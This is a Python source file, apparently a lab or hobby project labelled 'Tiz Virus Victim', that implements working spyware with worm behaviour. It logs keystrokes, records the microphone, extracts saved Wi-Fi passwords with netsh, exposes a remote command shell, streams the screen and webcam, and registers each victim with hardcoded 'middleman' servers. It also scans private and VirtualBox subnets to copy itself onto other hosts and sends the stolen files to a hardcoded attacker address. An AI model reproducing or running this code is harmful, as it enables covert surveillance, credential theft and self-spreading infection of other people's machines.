# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""

import threading
import subprocess
import socket
import argparse
import sys
import os
import time
import logging
from pynput.keyboard import Listener
import wave
import pyaudio
import zlib
import mss
import cv2
from PIL import Image
import queue
from http.client import HTTPConnection
import json
import numpy as np
import ipaddress
from threading import Lock


def parseargs():
    cli_args = argparse.ArgumentParser(description="Tiz Virus Victim")
    cli_args.add_argument('--host', help="listening ip, default is '0.0.0.0', no need to change", default='0.0.0.0',
                          type=str)
    cli_args.add_argument('--port',
                          help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2",
                          default=5000, type=int)
    cli_args.add_argument('--keylog', help="keylog=t create a keylogger file / keylog=f don't create the file",
                          default="t", type=str)
    cli_args.add_argument('--micro',
                          help="micro=10 record the microphone during 10 sec and put it in a file / micro=0 don't record",
                          default=10, type=int)
    cli_args.add_argument('--wifi', help="wifi=t create a file with all wifis password / wifi=f don't create the file",
                          default="t", type=str)
    cli_args.add_argument('--shell', help="shell=t revershell on port (default = 5000) / shell=f don't revershell",
                          default="t", type=str)
    cli_args.add_argument('--camera', help="camera=t stream camera on port+1 (default = 5001) / camera=f don't stream",
                          default="t", type=str)
    cli_args.add_argument('--screen', help="screen=t stream screen on port+2 (default = 5002) / screen=f don't stream",
                          default="t", type=str)
    options = cli_args.parse_args(sys.argv[1:])
    return options


def key_handler(key):
    logging.info(key)


def keylog():
    with Listener(on_press=key_handler) as listener:
        listener.join()


def Microphone(Seconds=10, File="record.wav"):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = float(Seconds)
    WAVE_OUTPUT_FILENAME = File
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    frames = []
    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()


def wifipass():
    with open("wifis.txt", "w", encoding="utf-8") as fichier:
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding="cp437").split('\n')
            wifis = [line.split(':')[1].strip() for line in data if "All User Profile" in line]
            for wifi in wifis:
                try:
                    keys = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear'],
                                                   encoding="cp437").split('\n')
                    key = [line.split(':')[1].strip() for line in keys if "Key Content" in line]
                    fichier.write(f"{wifi}: {key[0] if key else 'No password found'}\n")
                except subprocess.CalledProcessError as e:
                    print(f"Error retrieving password for {wifi}: {e}")
                except IndexError:
                    print(f"Password not found for {wifi}")
        except Exception as e:
            print(f"Failed to retrieve Wi-Fi profiles: {e}")


def retreive_screenshot(conn):
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            WIDTH, HEIGHT = 800, 450

            while True:
                try:
                    screenshot = sct.grab(monitor)
                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                    img_resized = img.resize((WIDTH, HEIGHT))
                    
                    try:
                        pixels = zlib.compress(img_resized.tobytes())
                        size = len(pixels)
                        
                        data = ((4).to_bytes(1, byteorder='big') + 
                               size.to_bytes(4, byteorder='big') + 
                               pixels)
                        conn.sendall(data)
                        
                        time.sleep(0.033)  # Cap at ~30 FPS
                        
                    except ConnectionError:
                        print("Screen connection lost")
                        break
                    except Exception as e:
                        print(f"Error sending screen: {e}")
                        break

                except Exception as e:
                    print(f"Error capturing screen: {e}")
                    break

    except Exception as e:
        print(f"Screen capture error: {e}")
    finally:
        try:
            conn.close()
        except:
            pass


def screen_sender(host='0.0.0.0', port=5001):
    while True:  # Add outer loop for continuous listening
        try:
            with socket.socket() as sock:
                # Add socket options to allow reuse
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind((host, port))
                sock.listen(5)
                print('Screen sender started and listening.')
                
                while True:
                    try:
                        conn, addr = sock.accept()
                        print(f"Screen client connected from {addr}")
                        thread = threading.Thread(target=retreive_screenshot, args=(conn,))
                        thread.daemon = True
                        thread.start()
                    except Exception as e:
                        print(f"Error accepting screen connection: {e}")
                        break
                        
        except Exception as e:
            print(f"Screen sender error: {e}")
            
        time.sleep(1)  # Wait before retrying


def send_file(client_socket, filename):
    """Send a file to the middleman"""
    try:
        filesize = os.path.getsize(filename)
        # Send file info
        file_info = f"{os.path.basename(filename)}|{filesize}"
        client_socket.send(file_info.encode('utf-8'))
        time.sleep(0.1)  # Give receiver time to process
        
        # Send file data
        with open(filename, 'rb') as f:
            while True:
                data = f.read(4096)
                if not data:
                    break
                client_socket.send(data)
        return True
    except Exception as e:
        print(f"Error sending file: {e}")
        return False


def record_screen(filename, duration):
    """Record screen for specified duration"""
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            width, height = 800, 450
            
            # Initialize video writer
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(filename, fourcc, 30.0, (width, height))
            
            start_time = time.time()
            while (time.time() - start_time) < float(duration):
                # Capture screen
                screenshot = sct.grab(monitor)
                img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                img_resized = img.resize((width, height))
                
                # Convert to OpenCV format and write
                frame = cv2.cvtColor(np.array(img_resized), cv2.COLOR_RGB2BGR)
                out.write(frame)
                
                time.sleep(1/30)  # Cap at 30 FPS
                
            out.release()
            return True
    except Exception as e:
        print(f"Error recording screen: {e}")
        return False


def record_camera(filename, duration):
    """Record camera for specified duration"""
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Add cv2.CAP_DSHOW for Windows
        if not cap.isOpened():
            print("Failed to open camera")
            return False
            
        width, height = 800, 450
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, 30.0, (width, height))
        
        start_time = time.time()
        while cap.isOpened() and (time.time() - start_time) < float(duration):
            ret, frame = cap.read()
            if not ret:
                break
                
            # Resize frame
            frame_resized = cv2.resize(frame, (width, height))
            out.write(frame_resized)
            
            time.sleep(1/30)  # Cap at 30 FPS
            
        cap.release()
        out.release()
        return True
    except Exception as e:
        print(f"Error recording camera: {e}")
        return False


def handle_client(client_socket):
    """Handle client commands including recording"""
    while True:
        try:
            command = client_socket.recv(1024).decode()
            if not command:
                break
                
            if command.startswith("record_screen"):
                try:
                    _, duration, filename = command.split()
                    client_socket.send("Recording screen started.".encode())
                    
                    # Record screen
                    success = record_screen(filename, float(duration))
                    if success and os.path.exists(filename):
                        client_socket.send("Recording completed.".encode())
                        # Send file through file transfer port
                        send_file(client_socket, filename)
                        # Clean up
                        os.remove(filename)
                    else:
                        client_socket.send("Recording failed.".encode())
                except Exception as e:
                    client_socket.send(f"Error in screen recording: {e}".encode())
                    
            elif command.startswith("record_camera"):
                try:
                    _, duration, filename = command.split()
                    client_socket.send("Recording camera started.".encode())
                    
                    # Record camera
                    success = record_camera(filename, float(duration))
                    if success and os.path.exists(filename):
                        client_socket.send("Recording completed.".encode())
                        # Send file through file transfer port
                        send_file(client_socket, filename)
                        # Clean up
                        os.remove(filename)
                    else:
                        client_socket.send("Recording failed.".encode())
                except Exception as e:
                    client_socket.send(f"Error in camera recording: {e}".encode())
                    
            else:
                output = subprocess.getoutput(command)
                client_socket.send(output.encode() if output else "Command executed.".encode())
                
        except Exception as e:
            print(f"Error handling client: {e}")
            break
            
    client_socket.close()


def R_tcp(host='0.0.0.0', port=5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"Reverse shell started and listening on {host}:{port}.")
    while True:
        client_socket, client_address = s.accept()
        print(f"{client_address[0]}:{client_address[1]} Connected!")
        threading.Thread(target=handle_client, args=(client_socket,)).start()


def capturevid(conn):
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("Failed to open camera")
            # Send error frame
            error_frame = np.zeros((300, 600, 3), dtype=np.uint8)
            cv2.putText(error_frame, "Camera Not Available", (150, 150), 
                       cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 255, 255), 2)
            compress_img = cv2.imencode('.jpg', error_frame)[1]
            pixels = zlib.compress(compress_img.tobytes())
            size = len(pixels)
            try:
                conn.send((4).to_bytes(1, byteorder='big'))
                conn.send(size.to_bytes(4, byteorder='big'))
                conn.sendall(pixels)
            except:
                pass
            return

        WIDTH, HEIGHT = 800, 450
        while cap.isOpened():
            try:
                ret, frame = cap.read()
                if not ret:
                    # Send error frame on camera failure
                    error_frame = np.zeros((HEIGHT, WIDTH, 3), dtype=np.uint8)
                    cv2.putText(error_frame, "Camera Error", (150, 150), 
                               cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 255, 255), 2)
                    frame = error_frame

                # Resize frame
                frame_resized = cv2.resize(frame, (WIDTH, HEIGHT))

                # Compress and send
                compress_img = cv2.imencode('.jpg', frame_resized)[1]
                pixels = zlib.compress(compress_img.tobytes())
                size = len(pixels)

                try:
                    conn.send((4).to_bytes(1, byteorder='big'))
                    conn.send(size.to_bytes(4, byteorder='big'))
                    conn.sendall(pixels)
                except ConnectionError:
                    print("Connection lost")
                    break
                except Exception as e:
                    print(f"Error sending frame: {e}")
                    break

            except Exception as e:
                print(f"Error capturing frame: {e}")
                break

    except Exception as e:
        print(f"Camera error: {e}")
    finally:
        if 'cap' in locals():
            cap.release()
        try:
            conn.close()
        except:
            pass


def camsender(port=5002):
    host = "0.0.0.0"
    while True:  # Add outer loop for continuous listening
        try:
            with socket.socket() as sock:
                # Add socket options to allow reuse
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind((host, port))
                sock.listen(5)
                print('Camera sender started and listening.')
                
                while True:
                    try:
                        conn, addr = sock.accept()
                        print(f"Camera client connected from {addr}")
                        thread = threading.Thread(target=capturevid, args=(conn,))
                        thread.daemon = True  # Make thread daemon
                        thread.start()
                    except Exception as e:
                        print(f"Error accepting camera connection: {e}")
                        break
                        
        except Exception as e:
            print(f"Camera sender error: {e}")
        
        time.sleep(1)  # Wait before retrying


def spread_payload(target_host, target_port):
    """Attempt to spread the payload to a vulnerable host."""
    try:
        # Create a connection to the target
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect((target_host, target_port))

            # Get our own file content
            with open(__file__, 'rb') as f:
                payload = f.read()

            # Send payload size first
            size = len(payload)
            s.send(size.to_bytes(4, byteorder='big'))

            # Send the payload
            s.sendall(payload)

            print(f"Successfully spread to {target_host}:{target_port}")

    except Exception as e:
        print(f"Failed to spread to {target_host}:{target_port}: {e}")


def start_spreading():
    print("Starting network scanner...")
    scanner = NetworkScanner()
    scanner.start()

    while True:
        try:
            scanner.scan_network()
            vulnerable_hosts = scanner.victims

            for host in vulnerable_hosts:
                threading.Thread(
                    target=spread_payload,
                    args=(host, 5000),
                    daemon=True
                ).start()

            time.sleep(10)  # Shorter delay between scans

        except Exception as e:
            print(f"Error in spreading routine: {e}")
            time.sleep(5)


def connect_to_middleman():
    """Try to connect to available middleman servers"""
    middleman_hosts = [
        '10.0.2.15',      # NAT default middleman
        '192.168.56.1',   # Host-only default middleman
        '192.168.1.15',   # Bridge mode middleman
        '10.0.3.15'       # NAT Network middleman
    ]
    middleman_port = 8080

    # Get local IP address
    local_ip = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        # If can't get IP, try alternative method
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

    if not local_ip:
        print("Could not determine local IP")
        return

    # Try to connect to each middleman
    for middleman_ip in middleman_hosts:
        try:
            print(f"Attempting to connect to middleman at {middleman_ip}...")
            conn = HTTPConnection(middleman_ip, middleman_port, timeout=1)
            headers = {'Content-type': 'application/json'}
            data = {
                'victim_ip': local_ip,
                'ports': {
                    'shell': 5000,
                    'screen': 5001,
                    'camera': 5002
                }
            }
            conn.request('POST', '/new_victim', json.dumps(data), headers)
            response = conn.getresponse()
            if response.status == 200:
                print(f"Successfully connected to middleman at {middleman_ip}")
                print(f"Victim IP: {local_ip}")
                print(f"Shell port: 5000")
                print(f"Screen port: 5001")
                print(f"Camera port: 5002")
                return True
        except Exception as e:
            print(f"Failed to connect to middleman at {middleman_ip}: {e}")
            continue
    return False


class NetworkScanner:
    def __init__(self):
        self.victims = set()
        self.known_victims = set()
        self.lock = Lock()
        self.running = True
        
        # Mở rộng các dải mạng VirtualBox phổ biến
        self.virtualbox_networks = [
            '10.0.2.0/24',     # NAT default
            '192.168.56.0/24', # Host-only default
            '192.168.0.0/24',  # Bridge mode common range
            '192.168.1.0/24',  # Bridge mode common range
            '192.168.2.0/24',  # Bridge mode common range
            '10.0.3.0/24',     # NAT Network common range
            '172.16.0.0/16',   # Custom range
            '172.17.0.0/16',   # Custom range
            '172.18.0.0/16'    # Custom range
        ]
        
        # Danh sách các middleman có thể kết nối
        self.middleman_hosts = [
            '10.0.2.15',      # NAT default middleman
            '192.168.56.1',   # Host-only default middleman
            '192.168.1.13',   # Bridge mode middleman
            '10.0.3.15'       # NAT Network middleman
        ]
        self.middleman_port = 8080
        
        self.target_ports = [5000, 5001, 5002]
        self.payload = None
        self.load_payload()

    def load_payload(self):
        """Load the current file as payload"""
        try:
            with open(__file__, 'rb') as f:
                self.payload = f.read()
        except Exception as e:
            print(f"Failed to load payload: {e}")

    def scan_port(self, host, port, timeout=0.1):  # Giảm timeout để quét nhanh hơn
        """Check if a port is open"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                result = s.connect_ex((host, port))
                return result == 0
        except:
            return False

    def notify_middleman(self, victim_ip):
        """Notify all possible middleman about new victim"""
        for middleman_ip in self.middleman_hosts:
            try:
                conn = HTTPConnection(middleman_ip, self.middleman_port, timeout=1)
                headers = {'Content-type': 'application/json'}
                data = {
                    'victim_ip': victim_ip,
                    'ports': {
                        'shell': self.target_ports[0],
                        'screen': self.target_ports[1],
                        'camera': self.target_ports[2]
                    }
                }
                conn.request('POST', '/new_victim', json.dumps(data), headers)
                response = conn.getresponse()
                if response.status == 200:
                    print(f"Successfully notified middleman at {middleman_ip}")
                    break
            except Exception as e:
                print(f"Failed to notify middleman at {middleman_ip}: {e}")
                continue

    def spread_to_host(self, host):
        """Attempt to spread payload to a vulnerable host"""
        try:
            # Try to connect and send payload
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((host, self.target_ports[0]))
                
                if self.payload:
                    # Send payload size
                    size = len(self.payload)
                    s.send(size.to_bytes(4, byteorder='big'))
                    
                    # Send payload
                    s.sendall(self.payload)
                    
                    print(f"Successfully spread to {host}")
                    
                    # Execute payload on remote host
                    command = f"python3 {__file__} --host 0.0.0.0 --port {self.target_ports[0]}"
                    s.send(command.encode())
                    
                    return True
                    
        except Exception as e:
            print(f"Failed to spread to {host}: {e}")
        return False

    def scan_network(self):
        """Scan networks for potential victims"""
        while self.running:
            for network in self.virtualbox_networks:
                try:
                    network_addr = ipaddress.IPv4Network(network)
                    print(f"Scanning network: {network}")
                    
                    # Scan each host in network
                    for ip in network_addr.hosts():
                        host = str(ip)
                        
                        # Skip if already a known victim
                        if host in self.known_victims:
                            continue

                        # Quick check for first port
                        if self.scan_port(host, self.target_ports[0]):
                            print(f"Found potential target: {host}")
                            
                            # Check all required ports
                            all_ports_open = True
                            for port in self.target_ports[1:]:
                                if not self.scan_port(host, port):
                                    all_ports_open = False
                                    break
                            
                            if all_ports_open:
                                print(f"Found vulnerable host: {host}")
                                # Try to spread
                                if self.spread_to_host(host):
                                    with self.lock:
                                        self.victims.add(host)
                                        self.known_victims.add(host)
                                        print(f"Successfully infected {host}")

                except Exception as e:
                    print(f"Error scanning network {network}: {e}")

            time.sleep(10)  # Quét lại sau mỗi 10 giây

    def start(self):
        """Start scanning in background thread"""
        self.scan_thread = threading.Thread(target=self.scan_network, daemon=True)
        self.scan_thread.start()

    def stop(self):
        """Stop scanning"""
        self.running = False
        if hasattr(self, 'scan_thread'):
            self.scan_thread.join(timeout=1.0)


if __name__ == "__main__":
    options = parseargs()
    
    print("\n=== Victim Client Starting ===")
    print(f"Host: {options.host}")
    print(f"Base port: {options.port}")
    
    # Try to connect to middleman first
    print("\nConnecting to middleman...")
    if connect_to_middleman():
        print("Successfully connected to middleman server")
    else:
        print("Failed to connect to any middleman server")
    
    print("\nStarting services...")
    
    if options.keylog == "t":
        print("Starting keylogger...")
        logging.basicConfig(filename="Keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
        threadlog = threading.Thread(target=keylog)
        threadlog.start()
        print("Keylogger started")
        
    if options.micro > 0:
        print("Starting microphone recording...")
        threadmic = threading.Thread(target=Microphone, args=(options.micro,))
        threadmic.start()
        print("Microphone recording started")
        
    if options.wifi == "t":
        print("Retrieving WiFi passwords...")
        wifipass()
        print("WiFi passwords retrieved")
        
    if options.shell == "t":
        print("Starting reverse shell...")
        threadshell = threading.Thread(target=R_tcp, args=(options.host, options.port))
        threadshell.start()
        print(f"Reverse shell started on port {options.port}")
        
    if options.screen == "t":
        print("Starting screen streaming...")
        WIDTH = 600
        HEIGHT = 300
        threadscreen = threading.Thread(target=screen_sender, args=(options.host, options.port + 1))
        threadscreen.start()
        print(f"Screen streaming started on port {options.port + 1}")
        
    if options.camera == "t":
        print("Starting camera streaming...")
        MAX_DGRAM = 2 ** 16
        MAX_IMAGE_DGRAM = MAX_DGRAM - 64
        threadcam = threading.Thread(target=camsender, args=(options.port + 2,))
        threadcam.start()
        print(f"Camera streaming started on port {options.port + 2}")
    
    # Start spreading thread
    print("\nStarting spreading mechanism...")
    spreading_thread = threading.Thread(target=start_spreading, daemon=True)
    spreading_thread.start()
    print("Spreading mechanism started")

    # File transfer setup
    print("\nSetting up file transfer...")
    attacker_host = '192.168.1.15'
    file_transfer_port = options.port + 3
    files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
    
    print(f"File transfer port: {file_transfer_port}")
    print("Files to send:", files_to_send)
    
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((attacker_host, file_transfer_port))
                for file in files_to_send:
                    send_file(s, file)
                print("Successfully connected and sent files.")
                break
        except Exception as e:
            time.sleep(5)

    print("\n=== Victim Client Running ===")